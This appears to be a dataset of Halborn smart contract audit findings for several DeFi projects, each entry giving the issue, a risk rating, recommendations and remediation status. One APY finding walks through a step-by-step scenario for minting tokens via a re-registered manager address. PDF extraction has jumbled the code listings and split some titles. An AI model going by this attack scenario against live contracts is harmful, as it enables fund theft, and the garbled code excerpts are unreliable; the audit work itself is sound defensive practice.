            "Sacred_Finance_Circom_Circuit",
            "Severity: Medium"
        ]
    },
    {
        "title": "INITIALIZATION CAN BE FRONTRUN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Sacred_Finance_Smart_Contract_Circom_Circuit_Security_Audit_Report_Final.pdf",
        "body": "It was identified that all the contracts that make use of an initialization function could be frontrun by an attacker during the deployment phase, who could then set critical parameters such as user roles. While Sacred Finance could re-deploy the contracts, it would incur financial costs. This was also evident from the deployment scripts which did not perform any checks whether the correct parameters were updated in the contracts by making use of an initialization function. Furthermore, if Sacred Finance deploys their contracts and does not identify that they have already been initialized, users could start using a system that was compromised from the start. Code Location: This applies to all contracts using an initializer function. Here is an example: Listing 2 if (! initialized ) { miner = _miner ; initialized = true ; 1 function initialize ( address _miner ) external { 2 3 4 5 6 } } The full list is provided below:  AaveInterestsProxy.sol  RewardSwap.sol  SacredProxy.sol  SacredTrees.sol 17 Risk Level: Likelihood - 4 Impact - 2 Recommendation: Halborn recommends that the initialization logic be checked to ensure that it cannot be frontrun. At a minimum, the initialize function must be reverted when called after initialization, and the logic must be included in the Constructor or a proxy pattern with deployment and initialization in the same function must be implemented instead. Remediation Plan: SOLVED: The Sacred Finance team solved the issue by adding the onlyOwner modifier to the initialize functions. 18 ",
        "labels": [
            "Halborn",
            "Sacred_Finance_Circom_Circuit",
            "Severity: Medium"
        ]
    },
    {
        "title": "LACK OF TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Sacred_Finance_Smart_Contract_Circom_Circuit_Security_Audit_Report_Final.pdf",
        "body": "Smart contracts did not implement a two-step transfer of ownership pat- tern. This pattern prevents transferring ownership of a smart contract to a wrong address, and never being able to retrieve control of it. While Sacred Finance might want to renounce ownership of the contracts, this should be done via the renounceOwnership function. On the other hand, the two-step ownership transfer pattern would allow to first propose a new owner, and only effectively transfer ownership when the new owner accepts it. If the original owner identifies an error in the proposal, they can cancel it at any time before the new owner accepts it. Risk Level: Likelihood - 2 Impact - 2 Recommendation: Halborn recommends that the pattern be implemented where it is deemed necessary so that roles can be safely transferred between accounts. Furthermore, when not governed by a governance, all privileged accounts must use a multi-signature account. Remediation Plan: SOLVED: The Sacred Finance team solved the issue by implementing the transfer-ownership pattern for the Sacred contract. 19 ",
        "labels": [
            "Halborn",
            "Sacred_Finance_Circom_Circuit",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO VALUE CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Sacred_Finance_Smart_Contract_Circom_Circuit_Security_Audit_Report_Final.pdf",
        "body": "Halborn identified that, within the code, the setter functions lacked input validation. While these functions can only be called by an ad- ministrative role, if they make a mistake an update error and set an invalid value, this could lead to calculation errors and potentially other functions reverting due to division by zero. Code Location: Listing 3 Nonce : 63 Gas used : 14178 Gas limit : 30000000 Block : 32477231 Gas price : 0.0 gwei Transaction confirmed 1 swap . poolWeight () 2 100000000000 3 >>> swap . setPoolWeight (0 , { ' from ': miner }) 4 Transaction sent : 0  x655ca2224e0cf75fc00b6a8589e0d27ca78da9fec7fdfcee71f4adc967e129e0 5 6  (0.05%) 7 8 < Transaction '0  x655ca2224e0cf75fc00b6a8589e0d27ca78da9fec7fdfcee71f4adc967e129e0 '  > 9 >>> swap . swap ( owner , 99999999999999999999999999999 , { ' from ': miner  }) 10 Transaction sent : 0  x9be32c81470c90602ada963b6864316ac3ac382f189549fb66fb8dc11cac7f41 11 12  25048 (0.08%) 13 14 swap . setPoolWeight (100000000000 , { ' from ': miner }) 15 Transaction sent : 0  xbbb7f9d4a6f1cb15e6501445e1472e20a7489d44c0db4270ab797b1c4c84126c 16 Gas price : 0.0 gwei Transaction confirmed ( reverted ) Gas price : 0.0 gwei Gas limit : 30000000 Gas limit : 30000000 Block : 32477232 Gas used : Nonce : 64 Nonce : 65 20 Block : 32477233 Gas used : 43403 Transaction confirmed 17  (0.14%) 18 19 < Transaction '0  xbbb7f9d4a6f1cb15e6501445e1472e20a7489d44c0db4270ab797b1c4c84126c '  > 20 >>> swap . swap ( owner , 99999999999999999999999999999 , { ' from ': miner  }) 21 Transaction sent : 0  xcd797da059f57eabc966385199e1b39647551303ca865e06e2995ab4b5652805 22 23  (0.17%) 24 25 < Transaction '0  xcd797da059f57eabc966385199e1b39647551303ca865e06e2995ab4b5652805 '  > Gas price : 0.0 gwei Transaction confirmed Gas limit : 30000000 Block : 32477234 Gas used : 49852 Nonce : 66 21 The full list can be found below:  ETHSacred - setAaveInterestsProxy  Sacred.sol - changeOperator, setFee  Miner.sol setMinimumInterests, - setVerifiers, setRates setPoolWeight, , setAaveInterestProxyContract is here (The reduced due to the functions only be callable by the governance role) setSacredTreesContract, setAaveInterestFee, mistake risk of  RewardSwap.sol - setPoolWeight  SacredProxy.sol - setSacredTreesContract, updateInstance (only callable by the governance role)  SacredTrees.sol - setSacredProxyContract, setVerifierContract (only callable by governance) Risk Level: Likelihood - 2 Impact - 2 Recommendation: Halborn recommends that checks be implemented to ensure that the different smart contract functions only accept the expected values. Remediation Plan: SOLVED: The Sacred Finance team solved the issue by adding additional null value checks where deemed necessary. 22 ",
        "labels": [
            "Halborn",
            "Sacred_Finance_Circom_Circuit",
            "Severity: Low"
        ]
    },
    {
        "title": "GAS OPTIMIZATIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Sacred_Finance_Smart_Contract_Circom_Circuit_Security_Audit_Report_Final.pdf",
        "body": "Within the for loops in the contract code, the variable i is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. This does not only apply to the iterator variable. It also applies to variables declared within the loop code block. Code Location:  Miner.sol Lines 172; 192; 406; 424  SacredProxy.sol Lines 56; 114  SacredProxyLight.sol Lines 32  MerkleTreeWithHistory.sol Lines 33; 59  Sacred.sol Lines 108  SacredTrees.sol Lines 112; 160 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of an uint variable inside a loop. This applies to the iterator variable and to variables declared within the loop code block. Remediation Plan: SOLVED: The Sacred Finance team solved the issue by using ++i instead of i++. 23 ",
        "labels": [
            "Halborn",
            "Sacred_Finance_Circom_Circuit",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING REENTRANCY PROTECTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Sacred_Finance_Smart_Contract_Circom_Circuit_Security_Audit_Report_Final.pdf",
        "body": "It was identified that one function within the Miner contract that made external calls to other contracts, which would then make use of a low- level call function to transfer funds, did not implement a reentrancy guard. While this function does not look exploitable due to additional validation, it is still recommended to implement the reentrancy guard to protect against extreme cases. Code Location: Miner.sol - Function withdraw Line #260 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Halborn recommends that the aforementioned function implement the nonReentrant modifier from OpenZeppelins contracts. Remediation Plan: SOLVED: the Sacred Finance team nonReentrant modifier to the withdraw function. solved The issue by adding the 24 ",
        "labels": [
            "Halborn",
            "Sacred_Finance_Circom_Circuit",
            "Severity: Informational"
        ]
    },
    {
        "title": "OUTDATED SOLIDITY VERSION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Sacred_Finance_Smart_Contract_Circom_Circuit_Security_Audit_Report_Final.pdf",
        "body": "While reviewing the contracts, it was identified that the pragma version in use was outdated. While this might not pose any direct security risks, the versions in use lack certain security features and optimizations which could greatly benefit the protocol. Some benefits are described below:  Safemath by default since 0.8.0 (can be more gas efficient than the SafeMath library)  Low level inline: as of 0.8.2, leads to cheaper gas runtime. This is especially relevant when the contract has small functions. For example, OpenZeppelin libraries typically have a lot of small helper functions, and if they are not built in, they cost an additional 20 to 40 gas due to the 2 extra jump instructions and additional stack operations needed for function calls.  Optimizer improvements in packed structs: Before 0.8.3, storing packed structs, in some cases, used an additional storage read operation. After EIP-2929, if the slot was already cold, this means an unnecessary stack operations and extra deploy time costs. However, if the slot was already warm, this means additional cost of 100 gas alongside the same unnecessary stack operations and extra deploy time costs.  Custom errors from 0.8.4, leads to cheaper deploy time cost and run-time cost. Note: the run-time cost is only relevant when the revert condition is met. In short, replace revert strings with custom errors. Furthermore, having built-in overflow/underflow checks could benefit the contract code to assure that calculations that use unsafe calculations (using +, -, /, *) will not be vulnerable under extreme test cases. 25 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Halborn recommends that the contracts are upgraded to a newer version of Solidity. The recommended version is >= 0.8.10 as these versions include several improvements and enhanced security features such as built-in overflow/underflow protection. It should be noted that this does not cover the casting of variable types. Remediation Plan: SOLVED: The Sacred Finance team solved the issue by using the 0.8.9 pragma version. 26 ",
        "labels": [
            "Halborn",
            "Sacred_Finance_Circom_Circuit",
            "Severity: Informational"
        ]
    },
    {
        "title": "REDUNDANT CODE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Sacred_Finance_Smart_Contract_Circom_Circuit_Security_Audit_Report_Final.pdf",
        "body": "While reviewing the code, it was identified that while a function to calculate the Aave reward amount was included in the Miner contract code, this was not used within the reward function, and instead, the same calculations were replicated. While not posing a security risk, this increases the complexity of the contracts, as well as the gas cost for deployment. Code Location: Miner.sol Lines #211-214 Listing 4 1 uint256 interestAmount ; 2 if ( totalShareSnapshots [ _args . rewardNullifier ][0] > 0) { interestAmount = totalShareSnapshots [ _args . rewardNullifier ][1]. 3  mul ( _args . apAmount ). div ( totalShareSnapshots [ _args . rewardNullifier  ][0]) ; 4 } Risk Level: Likelihood - 1 Impact - 1 Recommendation: Halborn recommends that the getAaveInterestAmount function is used instead of re-writing the code into the reward function. This could be rewritten as: 27 Listing 5 1 uint256 interestAmount = getAaveInterestAmount ( args .  rewardNullifier , args . apAmount ); Remediation Plan: SOLVED: getAaveInterestAmount function. Sacred Finance team The solved the issue by using the 28 3.9 Circuit Review Halborn reviewed the Circom circuits that Sacred Finance implemented in their code. The Circuits were reviewed for common ZK Snark circuits issues such as the following:  Integer overflow/underflow  Non-binding constrains  Double spending  Optimizations  Logic errors While most of the code was forked from Tornado Cash, there were specific differences which are described below. Sacred-Anonymity-Mining Within the Reward.circom circuits, an additional field was added, which represents the noteNullifierHash hash. This is later used to invalidate spent notes, and only the hashed value is used. This can be observed within the circuit code when computing the reward nullifier, which is the Poseidon hash of the noteNullifierHash instead of the noteNullifier as in Tornado Cash. Furthermore, to incorporate Aave lending interests, the following two signals were added: Listing 6 1 signal private input inputAaveInterestAmount 2 signal private input outputAaveInterestAmount This resulted in extra parameters used in the Poseidon hash function. Furthermore, the following was added: 29 Listing 7 1 apAmount === rate * ( withdrawalBlock - depositBlock ) 2 aaveInterestAmount === ( outputAaveInterestAmount -  inputAaveInterestAmount ); This ensures that the ap amount is constrained to the rate multiplied by the difference between the withdrawal and deposit block (thus the length of a deposit). Finally, the second line verifies the aaveInterestAmount input, asserting that the inputs to the circuit respect this equality. Within Withdraw.circom, Sacred Finance includes the AaveInterestAmount as shown below: Listing 8 1 inputAaveInterestAmount === outputAaveInterestAmount +  aaveInterestAmount ; This allows to ensure that the correct reward amount is validated via the ZK proof, upon withdrawal; In more detail, the input to the circuit needs to be equal to the Aave interest left in the contract after withdrawal plus the actual Aave interest amount rewarded to users. Sacred-Contracts-Eth The circuits within this repository include a template for MerkleTree computation, as well as a utility to compute the Pedersen hash of the commitment and the nullified for each proof. These circuits are the same as Tornado Cash. These utilities are used within the withdraw circuit. No security risks were identified within these circuits. SACRED TREES Within the BatchTreeUpdate.circom circuits, the only difference with Tornado cash is the CHUNK_TREE_HEIGHT being set to 1. This is correctly 30 replicated in the sacredTrees.sol smart contract. 31 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "Sacred_Finance_Circom_Circuit",
            "Severity: Informational"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkaswitch_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "All Smart Contracts use the floating pragma ^0.6.12. Contracts should be deployed with the same compiler version and flags used during development and testing. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma. For example, an outdated pragma version might introduce bugs that affect the contract system negatively or recently released pragma versions may have unknown security vulnerabilities. Reference: ConsenSys Diligence - Lock pragmas Code Location: Greeter.sol: [Line #2] SwitchToken.sol: [Line #23] staking/Farming.sol: [Line #1] 12 vesting/PrivateVesting.sol: [Line #1] vesting/Vesting.sol: [Line #1] Reference: ConsenSys Diligence - Lock pragmas Risk Level: Likelihood - 1 Impact - 3 Recommendations: It is not recommended to use a Consider locking the pragma version. floating pragma in production. It is possible to lock the pragma by fixing the version both in truffle-config.js for Truffle framework or in hardhat-config.js for HardHat framework. 13 Remediation Plan: SOLVED: Polkaswitch team locked the pragma version to 0.6.12 in all contracts. ",
        "labels": [
            "Halborn",
            "Polkaswitch",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkaswitch_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdraw function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against reentrancy attacks. Code Location: Vesting.sol Lines #134-142 PrivateVesting.sol Lines #102-110 14 Risk Level: Likelihood - 1 Impact - 4 Recommendation: The Vesting.sol and PrivateVesting.sol smart contracts are missing a nonReentrant guard. Use the nonReentrant modifier to avoid introducing future vulnerabilities. Remediation Plan: SOLVED: nonReentrant modifier was added to all the above reported methods. ",
        "labels": [
            "Halborn",
            "Polkaswitch",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF BLOCK.TIMESTAMP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkaswitch_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "The During a manual review, we noticed the use of block.timestamp. contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of now creates a risk that time manipulation can be performed to manipulate price oracles. Miners can modify the timestamp by up to 900 seconds. 15 Code Location: SwitchToken.sol: [Line #251] staking/Farming.sol: [Line #126] [Line #192], [Line #196], [Line #205], [Line #206] vesting/PrivateVesting.sol: [Line #75] [Line #158], [Line #160], [Line #162], [Line #164] 16 vesting/Vesting.sol: [Line #105] [Line #190], [Line #192], [Line #197] Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: NOT APPLICABLE: Development team confirmed that their timescale is larger than 900 seconds when using block.timestamp. So this issue will not affect in this case. 17 ",
        "labels": [
            "Halborn",
            "Polkaswitch",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkaswitch_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading call- data is cheaper than memory allocation. Public functions need to write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: SwitchToken.sol: [Line #86], [Line #93] [Line #136] vesting/PrivateVesting.sol: [Line #48], [Line #55], [Line #62], [Line #69] 18 [Line #73], [Line #86], [Line #102] [Line #116], [Line #139] 19 vesting/Vesting.sol: [Line #99], [Line #118], [Line #134] [Line #148], [Line #171] 20 Risk Level: Likelihood - 1 Impact - 1 Recommendations: Consider declaring external variables instead of public variables. A best practice is to use external if expecting a function to only be called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. Remediation Plan: SOLVED: Modifiers has been changed to external for all the methods above reported 21 3.5 STATIC ANALYSIS REPORT ",
        "labels": [
            "Halborn",
            "Polkaswitch",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBILITY OF MANUAL MINTING / BURNING OF MAPT TOKENS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/APY_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Due to the fact mint function from MetaPoolToken smart contract is public and restricted just by onlyManager modifier, a malicious owner can change temporarily PoolManager address and manually mint / burn mAPT tokens at will. This situation would allow malicious owner (or users as well) to deposit or withdraw more or less than their fair share. Code Location: Attack scenario: As a matter of example, a step-by-step attack scenario to mint mAPT tokens manually will be described. Step 1: Malicious owner (or even an external attacker) calls registerAddress function with the following parameters:  id: \"poolManager\"  _address: 0xABC...DEF (controlled by malicious owner) Listing 1: AddressRegistryV2.sol (Lines 114) 108 function registerAddress ( bytes32 id , address _address ) public 109 110 111 112 113 onlyOwner { require ( _address != address (0) , \" Invalid address \" ); if ( _idToAddress [ id ] == address (0) ) { // id wasn 't registered before , so add it to the list _idList . push ( id ); } 14 114 115 116 } _idToAddress [ id ] = _address ; emit AddressRegistered (id , _address ); Step 2: Malicious owner calls mint function manually from 0xABC...DEF address. Minting operation can be executed only if onlyManager modifier is cor- rectly verified. Listing 2: MetaPoolToken.sol (Lines 147) 143 144 145 146 147 148 149 150 151 152 153 154 function mint ( address account , uint256 amount ) public override nonReentrant onlyManager { } require ( amount > 0, \" INVALID_MINT_AMOUNT \" ); IOracleAdapter oracleAdapter = _getOracleAdapter () ; oracleAdapter . lock () ; _mint ( account , amount ); emit Mint ( account , amount ); Step 3: Automatically onlyManager modifier verifies if 0xABC...DEF address is equal to the value returned by poolManagerAddress function. Listing 3: MetaPoolToken.sol (Lines 131) 129 130 131 132 133 134 135 modifier onlyManager () { require ( msg . sender == addressRegistry . poolManagerAddress () , \" MANAGER_ONLY \" ); _; } 15 Step 4: Because the address of PoolManager has been previously changed in Step 1, poolManagerAddress function will return 0xABC...DEF. This kind of attack allows malicious owner to mint / burn mAPT tokens manually. Listing 4: AddressRegistryV2.sol (Lines 160) 159 function poolManagerAddress () public view override returns ( address ) { return getAddress ( \" poolManager \" ); 160 161 } Risk Level: Likelihood - 3 Impact - 4 Recommendation: The internal _fund function from PoolManager contract should not transfer stablecoins to LP Safe wallet, neither call public mint function from MetaPoolToken contract. Instead, it should call a new external fund function from MetaPoolToken contract. Below is a proposed sample code for this function. Listing 5: Sample code for fund function 1 2 3 4 5 6 7 8 9 function fund ( PoolTokenV2 pool , address account , uint256 amount ) external nonReentrant onlyManager { } require ( amount > 0, \" INVALID_MINT_AMOUNT \" ); underlyer . safeTransferFrom ( address ( pool ) , account , amount ); _mint ( account , amount ); 16 On the other hand, _mint function from MetaPoolToken contract must be internal. Below is a proposed sample code for this function. Listing 6: Sample code for mint function 1 2 3 4 5 6 7 8 9 10 11 function _mint ( address account , uint256 amount ) internal override nonReentrant { } require ( amount > 0, \" INVALID_MINT_AMOUNT \" ); IOracleAdapter oracleAdapter = _getOracleAdapter () ; oracleAdapter . lock () ; super . _mint ( account , amount ); emit Mint ( account , amount ); Finally, a similar security mechanism to the one indicated above should be applied to _burn function as well. Remediation plan: SOLVED: Issue fixed in commit 42c56dc7bf169224a628364d95906b2f73411516. PoolManager and MetaPoolToken contracts have been merged and now mint and burn functions are internal. 17 ",
        "labels": [
            "Halborn",
            "APY",
            "Severity: Medium"
        ]
    },
    {
        "title": "PRIVILEGED ADDRESSES CAN BE TRANSFERRED WITHOUT CONFIRMATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/APY_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "An incorrect use of the function setAdminAddress in contracts can set them to invalid addresses and inadvertently allow unauthorized upgrades of contract logic. The owner of the contracts can change proxy admin addresses using the aforementioned function in a single transaction and without confirmation from the new address. The affected smart contracts are the following:  PoolTokenV2  PoolManager  MetaPoolToken  AddressRegistryV2 Code Location: Listing 7: PoolTokenV2.sol 162 163 164 165 166 function setAdminAddress ( address adminAddress ) public onlyOwner { require ( adminAddress != address (0) , \" INVALID_ADMIN \" ); proxyAdmin = adminAddress ; emit AdminChanged ( adminAddress ); } Listing 8: PoolManager.sol 110 111 112 113 114 function setAdminAddress ( address adminAddress ) public onlyOwner { require ( adminAddress != address (0) , \" INVALID_ADMIN \" ); proxyAdmin = adminAddress ; emit AdminChanged ( adminAddress ); } 18 Listing 9: MetaPoolToken.sol 112 113 114 115 116 function setAdminAddress ( address adminAddress ) public onlyOwner { require ( adminAddress != address (0) , \" INVALID_ADMIN \" ); proxyAdmin = adminAddress ; emit AdminChanged ( adminAddress ); } Listing 10: AddressRegistryV2.sol 83 84 85 86 87 function setAdminAddress ( address adminAddress ) public onlyOwner { require ( adminAddress != address (0) , \" INVALID_ADMIN \" ); proxyAdmin = adminAddress ; emit AdminChanged ( adminAddress ); } Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to split privileged addresses transfer functionality into setAdminAddress and acceptAdminAddress functions. The latter func- tion allows the transfer to be completed by recipient. Below is a proposed sample code for acceptAdminAddress function. Listing 11: Sample code for acceptAdminAddress function 1 2 3 4 5 6 7 8 9 10 address public proxyAdmin ; address private pendingAdmin ; ... function acceptAdminAddress () external { require ( msg . sender == pendingAdmin , \" Must be proposed admin \"); address oldAdmin = proxyAdmin ; 19 proxyAdmin = msg . sender ; pendingAdmin = address (0) ; emit AdminTransferred ( oldAdmin , proxyAdmin ); 11 12 13 14 15 } Remediation plan: SOLVED: Issue fixed in commits 42c56dc7bf169224a628364d95906b2f73411516 and 357084f2c3eeed28b80f13d5a8e53f84121726c7. 20 MISSING ZERO-ADDRESS ",
        "labels": [
            "Halborn",
            "APY",
            "Severity: Medium"
        ]
    },
    {
        "title": "CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/APY_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The setSigner function from RewardDistributor contract should perform a zero-address check when receives an address as a user-supplied parameter, despite RBAC controls already implemented (e.g.: onlyOwner modifier). Code Location: Listing 12: RewardDistributor.sol (Lines 114) 113 114 115 function setSigner ( address newSigner ) external onlyOwner { signer = newSigner ; } Risk Level: Likelihood - 3 Impact - 1 Recommendation: Add address validation for user-supplied values in addition to the ex- isting OpenZeppelin RBAC controls. Remediation plan: NOT APPLICABLE: APY.Finance team claimed that RewardDistributor contract was not in scope for present audit and was reviewed in a previous Halborn audit. Since then, the contract has not changed. 21 ",
        "labels": [
            "Halborn",
            "APY",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF EVENTS FOR RELEVANT OPERATIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/APY_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Several relevant operations do not emit events. As a result, it will be difficult to review the correct behavior of the contracts once deployed. Relevant operations that would benefit from emitting events include:  PoolTokenV2.setFeePeriod  PoolTokenV2.setFeePercentage  PoolTokenV2.setReservePercentage  PoolTokenV2.infiniteApprove  PoolTokenV2.revokeApprove  PoolManager.fundLpSafe  PoolManager.withdrawFromLpSafe  AddressRegistryV2.deleteAddress  TVLManager.addAssetAllocation  TVLManager.removeAssetAllocation  OracleAdapter.setDefaultLockPeriod  OracleAdapter.setAssetValue  OracleAdapter.setTvl Users and/or blockchain monitoring systems are not able to timely detect suspicious behaviors without events. Code Location: Below is a sample of relevant functions that do not emit events, which complicates to detect suspicious behavior on smart contracts: 22 Listing 13: PoolTokenV2.sol 176 177 178 function setFeePeriod ( uint256 _feePeriod ) public onlyOwner { feePeriod = _feePeriod ; } Listing 14: PoolManager.sol 137 function fundLpSafe ( ILpSafeFunder . PoolAmount [] memory poolAmounts ) external override onlyOwner nonReentrant address lpSafeAddress = addressRegistry . lpSafeAddress () ; require ( lpSafeAddress != address (0) , \" INVALID_LP_SAFE \"); ( PoolTokenV2 [] memory pools , uint256 [] memory amounts ) = _getPoolsAndAmounts ( poolAmounts ); _fund ( lpSafeAddress , pools , amounts ); _registerPoolUnderlyers ( lpSafeAddress , pools ); 138 139 140 141 142 143 144 145 146 147 148 149 { } Listing 15: AddressRegistryV2.sol 142 143 144 145 146 147 148 149 150 151 152 function deleteAddress ( bytes32 id ) public onlyOwner { for ( uint256 i = 0; i < _idList . length ; i ++) { if ( _idList [ i] == id ) { // copy last element to slot i and shorten array _idList [ i] = _idList [ _idList . length - 1]; _idList . pop () ; delete _idToAddress [ id ]; break ; } } } Listing 16: TVLManager.sol 68 69 70 function addAssetAllocation ( Data memory data , string calldata symbol , 23 71 72 73 74 75 76 77 78 79 80 uint256 decimals ) external override nonReentrant onlyPermissioned { require (! isAssetAllocationRegistered ( data ) , \" DUPLICATE_DATA_DETECTED \"); bytes32 dataHash = generateDataHash ( data ); _allocationIds . add ( dataHash ); _allocationData [ dataHash ] = data ; _allocationSymbols [ dataHash ] = symbol ; _allocationDecimals [ dataHash ] = decimals ; lockOracleAdapter () ; } Listing 17: OracleAdapter.sol 156 157 158 159 160 161 162 163 164 function setTvl ( uint256 value , uint256 period ) external override locked onlyOwner { } // We do allow 0 values for submitted values submittedTvlValue = Value ( value , block . number . add ( period )) ; Risk Level: Likelihood - 2 Impact - 1 Recommendation: Add events for all relevant operations to help monitor the contracts and detect suspicious behavior. A monitoring system that tracks relevant events would allow timely detection of compromised system components. 24 Remediation plan: ACKNOWLEDGED: APY.Finance team acknowledged the finding and claimed that they have added events for all functions that have either side-effects or make external calls that could have side-effects (non-view functions). 25 ",
        "labels": [
            "Halborn",
            "APY",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/APY_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In public functions, array arguments are immediately copied to mem- ory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Also, methods do not necessarily have to be public if they are only called within the contract-in such case they should be marked internal. Code Location: Below are smart contracts and their corresponding functions affected: AddressRegistryV2: getIds, daiPoolAddress, usdcPoolAddress, usdtPoolAddress, mAptAddress, lpSafeAddress, oracleAdapterAddress poolManagerAddress, deleteAddress, chainlinkRegistryAddress, MetaPoolToken: mint, burn, calculateMintAmount, calculatePoolAmount, getDeployedValue PoolTokenV2: setAddressRegistry, setFeePeriod, setFeePercentage, setReservePercent- age, calculateMintAmount, getAPTValue, getUnderlyerAmountFromValue, ge- tReserveTopUpValue OracleAdapter: getAssetPrice 26 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider as much as possible declaring external variables instead of public variables. As for best practice, you should use external if you expect that the function will only be called externally and use public if you need to call the function internally. To sum up, all can access to public functions, external functions only can be accessed externally and internal functions can only be called within the contract. Remediation plan: SOLVED: Issue fixed in commit 42c56dc7bf169224a628364d95906b2f73411516. 27 ",
        "labels": [
            "Halborn",
            "APY",
            "Severity: Informational"
        ]
    },
    {
        "title": "EXPERIMENTAL FEATURES ENABLED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/APY_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "ABIEncoderV2 is enabled and the use of experimental features could be dangerous on live deployments. The experimental ABI encoder does not handle non-integer values shorter than 32 bytes properly. This applies to bytesNN types, bool, enum and other types when they are part of an array or a struct and encoded directly from storage. This means these storage references have to be used directly inside abi.encode(...) as arguments in external function calls or in event data without prior assignment to a local variable. The types bytesNN and bool will result in corrupted data while enum might lead to an invalid revert. Code Location: Listing 18: Contracts with experimental features enabled 1 2 3 4 5 6 7 8 AddressRegistryV2 MetaPoolToken MetaPoolTokenProxy PoolManager PoolManagerProxy PoolTokenProxy PoolTokenV2 TVLManager Risk Level: Likelihood - 1 Impact - 1 28 Recommendation: When possible, do not use experimental features in the final live de- ployment. Validate and check that all the conditions above are true for integers and arrays (i.e. all using uint256). Remediation plan: ACKNOWLEDGED: APY.Finance team acknowledged the finding and claimed that ABIEncoderV2 is only enabled on contracts where it is strictly necessary. 29 ",
        "labels": [
            "Halborn",
            "APY",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISUSE OF AN ORACLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Green_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The UniswapAnchoredView contract is calling latestAnswer to get the last asset price. This method will return the last value, but it will not On the other hand, calling the allow checking if the data is fresh. method latestRoundData allows running additional validation. Code Location: Listing 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function validate ( address gToken ) external returns ( Error , bool valid ) { // Anyone can call validate if the market is calling it fetch the config using the Gtoken market address otherwise fetch the config using the gToken address given // NOTE : We don 't do any access control on msg . sender here . The access control is done in getTokenConfigByReporter , // which will REVERT if an unauthorized address is passed . TokenConfig memory config = getTokenConfigByGToken ( msg . sender ); config = config . gToken == msg . sender ? config : getTokenConfigByGToken ( gToken ); int256 currentAnswer = ( AggregatorValidatorInterface ( config . reporter ). latestAnswer () ); ( Error error2 , uint256 reportedPrice ) = convertReportedPrice ( config , currentAnswer ); if ( error2 != Error . NO_ERROR ){ emit Fail ( error2 ); return ( error2 , false ); 19 